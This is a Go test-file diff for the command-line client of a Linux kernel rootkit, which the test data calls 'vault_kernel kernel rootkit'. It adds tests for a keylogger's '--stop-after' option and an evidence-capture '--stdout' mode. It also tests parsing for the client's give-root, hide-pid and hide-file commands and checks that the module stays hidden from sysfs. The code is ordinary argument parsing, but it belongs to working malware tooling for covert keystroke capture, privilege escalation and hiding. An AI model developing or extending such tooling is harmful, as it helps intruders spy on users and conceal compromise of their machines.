@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"os"
 	"strings"
@@ -14,7 +15,7 @@ import (
 func TestMarshalStatsJSON(t *testing.T) {
 	raw := map[string]string{
 		"module":          "vault_kernel",
-		"version":         "3.10",
+		"version":         "3.11",
 		"hooks_installed": "7",
 		"hooks_planned":   "7",
 		"module_hidden":   "0",
@@ -42,7 +43,7 @@ func TestMarshalStatsJSON(t *testing.T) {
 			t.Errorf("%s should marshal as a number, got %T (%v)", k, out[k], out[k])
 		}
 	}
-	if out["module"] != "vault_kernel" || out["version"] != "3.10" {
+	if out["module"] != "vault_kernel" || out["version"] != "3.11" {
 		t.Errorf("string values mangled: module=%v version=%v", out["module"], out["version"])
 	}
 }
@@ -259,6 +260,51 @@ func TestFormatKeylogEvent(t *testing.T) {
 // v3.9: --output extends the keylog grammar. It takes exactly one FILE
 // operand, may appear once, composes with --follow/--timestamps, and a
 // missing operand is a usage error (same strictness as the interval).
+// parseKeylogArgs v3.11: the --stop-after grammar — follow-only,
+// required numeric operand >= 1, at most once.
+func TestParseKeylogArgsStopAfter(t *testing.T) {
+	// Valid: --follow --stop-after N (any order).
+	for _, args := range [][]string{
+		{"--follow", "--stop-after", "5"},
+		{"--stop-after", "5", "--follow"},
+		{"--follow", "--stop-after", "1"},
+	} {
+		opts, err := parseKeylogArgs(args)
+		if err != nil || !opts.follow || opts.stopAfter != 5 && opts.stopAfter != 1 {
+			t.Errorf("parseKeylogArgs(%v) = (%+v, %v)", args, opts, err)
+		}
+	}
+	// Without --follow it is a usage error (one-shot reads one buffer).
+	if _, err := parseKeylogArgs([]string{"--stop-after", "5"}); err == nil ||
+		!strings.Contains(err.Error(), "--stop-after requires --follow") {
+		t.Errorf("--stop-after without --follow must error, got %v", err)
+	}
+	// Missing operand.
+	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after"}); err == nil {
+		t.Errorf("--stop-after without operand must error")
+	}
+	// Zero and negative.
+	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after", "0"}); err == nil {
+		t.Errorf("--stop-after 0 must error")
+	}
+	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after", "-3"}); err == nil {
+		t.Errorf("--stop-after -3 must error")
+	}
+	// Non-numeric.
+	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after", "abc"}); err == nil {
+		t.Errorf("--stop-after abc must error")
+	}
+	// Duplicated.
+	if _, err := parseKeylogArgs([]string{"--follow", "--stop-after", "2", "--stop-after", "3"}); err == nil {
+		t.Errorf("double --stop-after must error")
+	}
+	// Default stays 0 (unlimited).
+	opts, err := parseKeylogArgs([]string{"--follow"})
+	if err != nil || opts.stopAfter != 0 {
+		t.Errorf("bare --follow: stopAfter = %d, err = %v", opts.stopAfter, err)
+	}
+}
+
 func TestParseKeylogArgsOutput(t *testing.T) {
 	// --output alone (one-shot) is valid: writes the buffer once.
 	opts, err := parseKeylogArgs([]string{"--output", "/tmp/k.log"})
@@ -284,34 +330,138 @@ func TestParseKeylogArgsOutput(t *testing.T) {
 	}
 }
 
-// parseCaptureArgs owns the `capture` grammar: capture [--out FILE],
-// --out exactly once with a required non-empty operand, anything else
-// is a usage error.
+// parseCaptureArgs owns the `capture` grammar: capture [--out FILE]
+// [--stdout], --out exactly once with a required non-empty operand,
+// --stdout at most once, anything else is a usage error. (v3.11 adds
+// the --stdout boolean and the duplicated-flag check for it.)
 func TestParseCaptureArgs(t *testing.T) {
 	// Bare capture → stdout.
-	if p, err := parseCaptureArgs(nil); err != nil || p != "" {
-		t.Errorf("no args: got (%q, %v), want (\"\", nil)", p, err)
+	if p, st, err := parseCaptureArgs(nil); err != nil || p != "" || st {
+		t.Errorf("no args: got (%q, %v, %v), want (\"\", false, nil)", p, st, err)
 	}
 	// --out PATH.
-	if p, err := parseCaptureArgs([]string{"--out", "/tmp/e.json"}); err != nil || p != "/tmp/e.json" {
-		t.Errorf("--out: got (%q, %v)", p, err)
+	if p, st, err := parseCaptureArgs([]string{"--out", "/tmp/e.json"}); err != nil || p != "/tmp/e.json" || st {
+		t.Errorf("--out: got (%q, %v, %v)", p, st, err)
+	}
+	// --stdout alone is accepted and redundant (scripts may pass it
+	// unconditionally).
+	if p, st, err := parseCaptureArgs([]string{"--stdout"}); err != nil || p != "" || !st {
+		t.Errorf("--stdout alone: got (%q, %v, %v)", p, st, err)
+	}
+	// --out + --stdout in any order.
+	if p, st, err := parseCaptureArgs([]string{"--stdout", "--out", "e.json"}); err != nil || p != "e.json" || !st {
+		t.Errorf("--stdout --out: got (%q, %v, %v)", p, st, err)
+	}
+	if p, st, err := parseCaptureArgs([]string{"--out", "e.json", "--stdout"}); err != nil || p != "e.json" || !st {
+		t.Errorf("--out --stdout: got (%q, %v, %v)", p, st, err)
+	}
+	// Duplicated --stdout.
+	if _, _, err := parseCaptureArgs([]string{"--stdout", "--stdout"}); err == nil {
+		t.Errorf("double --stdout must error")
 	}
 	// Missing operand.
-	if _, err := parseCaptureArgs([]string{"--out"}); err == nil {
+	if _, _, err := parseCaptureArgs([]string{"--out"}); err == nil {
 		t.Errorf("--out without operand must error")
 	}
 	// Empty operand.
-	if _, err := parseCaptureArgs([]string{"--out", ""}); err == nil {
+	if _, _, err := parseCaptureArgs([]string{"--out", ""}); err == nil {
 		t.Errorf("--out '' must error")
 	}
 	// Duplicated flag.
-	if _, err := parseCaptureArgs([]string{"--out", "a", "--out", "b"}); err == nil {
+	if _, _, err := parseCaptureArgs([]string{"--out", "a", "--out", "b"}); err == nil {
 		t.Errorf("double --out must error")
 	}
 	// Unknown token.
-	if _, err := parseCaptureArgs([]string{"extra"}); err == nil {
+	if _, _, err := parseCaptureArgs([]string{"extra"}); err == nil {
 		t.Errorf("stray token must error")
 	}
+}
+
+// emitCaptureBundle is the v3.11 delivery matrix of `capture`:
+// stdout-only, file+summary(stdout), file+JSON(stdout)+summary(stderr).
+// The file side is verified with a temp directory; the stream side via
+// os.Pipe captures.
+func TestEmitCaptureBundle(t *testing.T) {
+	j := []byte("{\"schema\": 1}")
+
+	// 1. No outPath: JSON to stdout, no file.
+	out := captureStdout(t, func() { _ = emitCaptureBundle(j, "", false) })
+	if string(out) != "{\"schema\": 1}\n" {
+		t.Errorf("stdout-only: got %q", out)
+	}
+
+	dir := t.TempDir()
+	path := dir + "/ev.json"
+
+	// 2. File without --stdout: summary to stdout, NOTHING to stdout as JSON.
+	out = captureStdout(t, func() { _ = emitCaptureBundle(j, path, false) })
+	if string(out) != "[+] Evidence bundle written to "+path+" (14 bytes)\n" {
+		t.Errorf("file mode stdout: got %q", out)
+	}
+	data, err := os.ReadFile(path)
+	if err != nil || string(data) != "{\"schema\": 1}\n" {
+		t.Errorf("file mode content: %q err=%v", data, err)
+	}
+
+	// 3. File + --stdout: JSON to stdout, summary to stderr.
+	os.Remove(path)
+	out, errOut := captureStdoutStderr(t, func() { _ = emitCaptureBundle(j, path, true) })
+	if string(out) != "{\"schema\": 1}\n" {
+		t.Errorf("--stdout JSON: got %q", out)
+	}
+	if string(errOut) != "[+] Evidence bundle written to "+path+" (14 bytes)\n" {
+		t.Errorf("--stdout summary (stderr): got %q", errOut)
+	}
+	info, err := os.Stat(path)
+	if err != nil {
+		t.Fatalf("--stdout file: %v", err)
+	}
+	if perm := info.Mode().Perm(); perm != 0600 {
+		t.Errorf("--stdout file perm = %o, want 600", perm)
+	}
+
+	// 4. Unwritable path -> wrapped error.
+	if err := emitCaptureBundle(j, dir+"/no/such/dir/ev.json", false); err == nil ||
+		!strings.Contains(err.Error(), "capture: cannot write") {
+		t.Errorf("unwritable path: err=%v", err)
+	}
+}
+
+// captureStdout runs fn with os.Stdout redirected to a pipe and
+// returns everything written to it.
+func captureStdout(t *testing.T, fn func()) []byte {
+	out, _ := captureStdoutStderr(t, func() {
+		old := os.Stderr
+		devnull, _ := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
+		os.Stderr = devnull
+		fn()
+		os.Stderr = old
+		devnull.Close()
+	})
+	return out
+}
+
+// captureStdoutStderr runs fn with BOTH standard streams redirected to
+// pipes and returns what each captured.
+func captureStdoutStderr(t *testing.T, fn func()) ([]byte, []byte) {
+	t.Helper()
+	rOut, wOut, _ := os.Pipe()
+	rErr, wErr, _ := os.Pipe()
+	oldOut, oldErr := os.Stdout, os.Stderr
+	os.Stdout, os.Stderr = wOut, wErr
+	done := make(chan struct{})
+	var outBuf, errBuf bytes.Buffer
+	go func() {
+		outBuf.ReadFrom(rOut)
+		errBuf.ReadFrom(rErr)
+		close(done)
+	}()
+	fn()
+	wOut.Close()
+	wErr.Close()
+	os.Stdout, os.Stderr = oldOut, oldErr
+	<-done
+	return outBuf.Bytes(), errBuf.Bytes()
 }
 
 // keylogSink is the --output persistence: append-only, flushed per
@@ -373,7 +523,7 @@ func TestKeylogSink(t *testing.T) {
 func TestBuildCaptureReport(t *testing.T) {
 	raw := map[string]string{
 		"module":          "vault_kernel",
-		"version":         "3.10",
+		"version":         "3.11",
 		"hooks_installed": "7",
 		"hooks_planned":   "7",
 		"module_hidden":   "0",
@@ -399,7 +549,7 @@ func TestBuildCaptureReport(t *testing.T) {
 	if rep.ModuleInSysfs {
 		t.Errorf("module_in_sysfs = true, want false")
 	}
-	if rep.Stats["hooks_installed"].(int) != 7 || rep.Stats["version"] != "3.10" {
+	if rep.Stats["hooks_installed"].(int) != 7 || rep.Stats["version"] != "3.11" {
 		t.Errorf("stats conversion wrong: %v", rep.Stats)
 	}
 	if len(rep.Hidden.PIDs) != 1 || rep.Hidden.Files[0] != "secret.txt" {
@@ -622,7 +772,7 @@ func TestParseWatchArgsOnce(t *testing.T) {
 func TestParseModinfo(t *testing.T) {
 	out := "filename:       /lib/modules/6.1.0/vault_kernel.ko\n" +
 		"srcversion:     ABC123\n" +
-		"version:        3.10\n" +
+		"version:        3.11\n" +
 		"author:         ruby570bocadito\n" +
 		"description:    vault_kernel kernel rootkit\n" +
 		"license:        GPL\n"
@@ -631,7 +781,7 @@ func TestParseModinfo(t *testing.T) {
 		t.Fatalf("parseModinfo returned nil for a complete output")
 	}
 	if mi.Filename != "/lib/modules/6.1.0/vault_kernel.ko" ||
-		mi.Version != "3.10" || mi.Author != "ruby570bocadito" ||
+		mi.Version != "3.11" || mi.Author != "ruby570bocadito" ||
 		mi.Description != "vault_kernel kernel rootkit" {
 		t.Errorf("fields mangled: %+v", mi)
 	}
@@ -645,8 +795,8 @@ func TestParseModinfo(t *testing.T) {
 	}
 
 	// Subset: only version present.
-	mi = parseModinfo("version:  3.10\nlicense: GPL\n")
-	if mi == nil || mi.Version != "3.10" || mi.Author != "" {
+	mi = parseModinfo("version:  3.11\nlicense: GPL\n")
+	if mi == nil || mi.Version != "3.11" || mi.Author != "" {
 		t.Errorf("subset parse: %+v (want version only)", mi)
 	}
 
@@ -659,8 +809,8 @@ func TestParseModinfo(t *testing.T) {
 	}
 
 	// Empty value for a contract key is skipped; first occurrence wins.
-	mi = parseModinfo("version:\nversion: 3.10\n")
-	if mi == nil || mi.Version != "3.10" {
+	mi = parseModinfo("version:\nversion: 3.11\n")
+	if mi == nil || mi.Version != "3.11" {
 		t.Errorf("empty-value handling: %+v", mi)
 	}
 }
@@ -669,7 +819,7 @@ func TestParseModinfo(t *testing.T) {
 // module_in_sysfs always present, modinfo omitted (omitempty) when the
 // modinfo probe did not run or found nothing.
 func TestBuildStatusReport(t *testing.T) {
-	mi := &modinfoInfo{Filename: "/x/vault_kernel.ko", Version: "3.10"}
+	mi := &modinfoInfo{Filename: "/x/vault_kernel.ko", Version: "3.11"}
 	rep := buildStatusReport(true, false, mi)
 	if rep.Schema != jsonSchemaVersion || !rep.DevicePresent || rep.ModuleInSysfs {
 		t.Errorf("scalar fields wrong: %+v", rep)
@@ -702,6 +852,88 @@ func TestBuildStatusReport(t *testing.T) {
 // v3.10: flag operands starting with '-' are a MISSING operand, never
 // a file called "--follow" or "-foo" — parity with argparse, which
 // rejects the same input with "expected one argument".
+// posixOperandArgs pins the v3.11 parity table with the argparse
+// surface (each cell reproduced against the Python client before
+// coding — see the round report): bare dash-leading operands are
+// rejected, the "--" escape hands them through, "-" and negative
+// numbers stay verbatim, and give-root -5 keeps working.
+// deviceRequired pins the v3.11 no-root contract: the pre-device
+// commands never trigger the non-root warning (status is THE no-root
+// check since v3.10); everything else warns.
+func TestDeviceRequired(t *testing.T) {
+	for _, cmd := range []string{"status", "version", "-v", "--version",
+		"help", "-h", "--help", "magic-encode"} {
+		if deviceRequired(cmd) {
+			t.Errorf("deviceRequired(%q) = true, want false (no-root command)", cmd)
+		}
+	}
+	for _, cmd := range []string{"stats", "list", "doctor", "watch",
+		"keylog", "capture", "hide-file", "give-root", "reset",
+		"unknown-cmd"} {
+		if !deviceRequired(cmd) {
+			t.Errorf("deviceRequired(%q) = false, want true", cmd)
+		}
+	}
+}
+
+func TestPosixOperandArgs(t *testing.T) {
+	// Bare dash-leading operand -> rejected, error names the token.
+	_, err := posixOperandArgs([]string{"-foo"})
+	if err == nil || !strings.Contains(err.Error(), "unknown option: -foo") {
+		t.Errorf("bare -foo: err = %v", err)
+	}
+	// The error teaches the escape.
+	if !strings.Contains(err.Error(), "'-- -foo'") {
+		t.Errorf("error must teach the escape, got: %v", err)
+	}
+	// The POSIX escape hands the value through verbatim.
+	rest, err := posixOperandArgs([]string{"--", "-foo"})
+	if err != nil || len(rest) != 1 || rest[0] != "-foo" {
+		t.Errorf("-- -foo: rest = %v, err = %v", rest, err)
+	}
+	// Lone "-" is a POSIX operand, verbatim.
+	rest, err = posixOperandArgs([]string{"-"})
+	if err != nil || len(rest) != 1 || rest[0] != "-" {
+		t.Errorf("-: rest = %v, err = %v", rest, err)
+	}
+	// Negative numbers stay operands (argparse positional rule).
+	for _, num := range []string{"-5", "-3.5", "-0"} {
+		rest, err = posixOperandArgs([]string{num})
+		if err != nil || len(rest) != 1 || rest[0] != num {
+			t.Errorf("%s: rest = %v, err = %v", num, rest, err)
+		}
+	}
+	// No escape, normal operand: verbatim.
+	rest, err = posixOperandArgs([]string{"secret.txt"})
+	if err != nil || len(rest) != 1 || rest[0] != "secret.txt" {
+		t.Errorf("plain name mangled: %v, %v", rest, err)
+	}
+	// Empty args: verbatim.
+	rest, err = posixOperandArgs(nil)
+	if err != nil || len(rest) != 0 {
+		t.Errorf("nil args mangled: %v, %v", rest, err)
+	}
+	// give-root -5 keeps the self-contract through the full parser.
+	pid, err := parseGiveRootPID(mustPosix(t, "-5"))
+	if err != nil || pid != -5 {
+		t.Errorf("give-root -5: pid = %d, err = %v", pid, err)
+	}
+	// hide-pid -- -5 is still rejected by the VALUE rule (>= 1).
+	if _, err := parsePIDArgs([]string{"--", "-5"}, "hide-pid"); err == nil {
+		t.Errorf("hide-pid -- -5 must fail the >= 1 rule")
+	}
+}
+
+// mustPosix is a test helper: posixOperandArgs or fail.
+func mustPosix(t *testing.T, args ...string) []string {
+	t.Helper()
+	rest, err := posixOperandArgs(args)
+	if err != nil {
+		t.Fatalf("posixOperandArgs(%v): %v", args, err)
+	}
+	return rest
+}
+
 func TestFlagValuesRejectLeadingDash(t *testing.T) {
 	for _, bad := range [][]string{
 		{"--output", "--follow"},
@@ -718,12 +950,12 @@ func TestFlagValuesRejectLeadingDash(t *testing.T) {
 		{"--out", "-x"},
 		{"--out", "--"},
 	} {
-		if _, err := parseCaptureArgs(bad); err == nil {
+		if _, _, err := parseCaptureArgs(bad); err == nil {
 			t.Errorf("parseCaptureArgs(%v) must reject a dash-prefixed FILE", bad)
 		}
 	}
 	// The error names the offending token (no silent eating).
-	_, err := parseCaptureArgs([]string{"--out", "--json"})
+	_, _, err := parseCaptureArgs([]string{"--out", "--json"})
 	if err != nil && !strings.Contains(err.Error(), "--json") {
 		t.Errorf("error must name the offending token, got: %v", err)
 	}
